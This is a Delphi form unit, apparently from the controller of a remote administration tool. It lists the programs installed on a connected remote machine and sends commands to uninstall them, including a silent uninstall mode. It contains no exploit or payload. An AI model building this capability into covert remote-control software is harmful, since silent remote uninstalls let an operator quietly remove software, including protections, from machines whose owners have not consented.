unit UnitProgramas;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, Menus, ComCtrls, UnitConexao, sSkinProvider;

type
  TFormProgramas = class(TForm)
    StatusBar1: TStatusBar;
    AdvListView1: TListView;
    PopupMenu1: TPopupMenu;
    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Desinstalar1: TMenuItem;
    Desinstalarmodosilencioso1: TMenuItem;
    sSkinProvider1: TsSkinProvider;
    procedure FormCreate(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Desinstalarmodosilencioso1Click(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure AdvListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
    procedure ClickTheColumn;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormProgramas: TFormProgramas;

implementation

{$R *.dfm}

uses
  UnitConstantes,
  UnitStrings,
  CustomIniFiles,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormProgramas.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormProgramas.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormProgramas.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
begin
  Result := 0;
  if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
  else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);

  if not Ascending then Result := -Result;
end;

procedure TFormProgramas.ClickTheColumn;
begin
  if LastSortedColumn = nil then exit;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormProgramas.AdvListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to AdvListview1.Columns.Count -1 do AdvListview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormProgramas.AtualizarIdioma;
begin
  AdvListView1.Column[0].Caption := traduzidos[420];
  AdvListView1.Column[1].Caption := traduzidos[421];
  AdvListView1.Column[2].Caption := traduzidos[422];
  AdvListView1.Column[3].Caption := traduzidos[423];
  AdvListView1.Column[4].Caption := traduzidos[424];

  Atualizar1.Caption := traduzidos[192];
  Desinstalar1.Caption := traduzidos[423];
  Desinstalarmodosilencioso1.Caption := traduzidos[424];
end;

constructor TFormProgramas.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('Programs', 'Width', Width);
    Height := IniFile.ReadInteger('Programs', 'Height', Height);
    Left := IniFile.ReadInteger('Programs', 'Left', Left);
    Top := IniFile.ReadInteger('Programs', 'Top', Top);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('Programs', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('Programs', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('Programs', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView1.Column[3].Width := IniFile.ReadInteger('Programs', 'LV1_3', AdvListView1.Column[3].Width);
    AdvListView1.Column[4].Width := IniFile.ReadInteger('Programs', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormProgramas.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Programs', 'Width', Width);
    IniFile.WriteInteger('Programs', 'Height', Height);
    IniFile.WriteInteger('Programs', 'Left', Left);
    IniFile.WriteInteger('Programs', 'Top', Top);
    IniFile.WriteInteger('Programs', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('Programs', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('Programs', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('Programs', 'LV1_3', AdvListView1.Column[3].Width);
    IniFile.WriteInteger('Programs', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormProgramas.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
end;

procedure TFormProgramas.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  Atualizar1Click(Atualizar1);
end;

procedure TFormProgramas.PopupMenu1Popup(Sender: TObject);
begin
  Atualizar1.Enabled := true;
  Desinstalar1.Enabled := (AdvListView1.Selected <> nil) and (AdvListView1.Selected.SubItems.Strings[2] <> '');
  Desinstalarmodosilencioso1.Enabled := (AdvListView1.Selected <> nil) and (AdvListView1.Selected.SubItems.Strings[3] <> '');
end;

procedure TFormProgramas.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: integer;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEPROGRAMAS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    AdvListView1.Items.BeginUpdate;
    if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
    try
      while (recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(#13#10, Recebido) - 1);
        delete(Recebido, 1, posex(#13#10, Recebido) + 1);

        Item := AdvListView1.Items.Add;
        Item.ImageIndex := 35;

        Result := SplitString(TempStr, delimitadorComandos);

        Item.Caption := Result[0];
        Item.SubItems.Add(Result[1]);
        Item.SubItems.Add(Result[2]);
        Item.SubItems.Add(Result[3]);
        Item.SubItems.Add(Result[4]);
      end;
      for i := AdvListView1.Items.Count - 1 downto 0 do
      if AdvListView1.Items.Item[i].Caption = '' then AdvListView1.Items.Item[i].Delete;
      finally
      AdvListView1.Items.EndUpdate;
    end;
    AdvListView1.Refresh;
    statusbar1.Panels.Items[0].Text := traduzidos[425];
  end else

end;

procedure TFormProgramas.Atualizar1Click(Sender: TObject);
begin
  Servidor.enviarString(LISTADEPROGRAMAS + '|');
  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormProgramas.Desinstalar1Click(Sender: TObject);
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[426] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST)  <> idYes then Exit;

  Servidor.enviarString(DESINSTALARPROGRAMA + '|' + AdvListview1.Selected.SubItems.Strings[2]);
end;

procedure ParseInstaller(Data: string; var path: string; var param: string);
var
  exe: string;
  p: integer;
begin
  if copy(data,1,1) <> '"' then begin
   path := data;
   param := '';
   exit;
  end;

  Delete(Data,1,1);
  p := posex('"',Data);
  path := copy(Data,1,p-1);
  Delete(data,1,p+1);
  param := data;
end;

procedure TFormProgramas.Desinstalarmodosilencioso1Click(Sender: TObject);
var
  i: integer;
  path, param: string;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[426] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  ParseInstaller(AdvListview1.Selected.SubItems.Strings[3], Path, Param);
  Servidor.enviarString(DESINSTALARPROGRAMASILENT + '|' + Path + delimitadorComandos + Param);
end;

end.
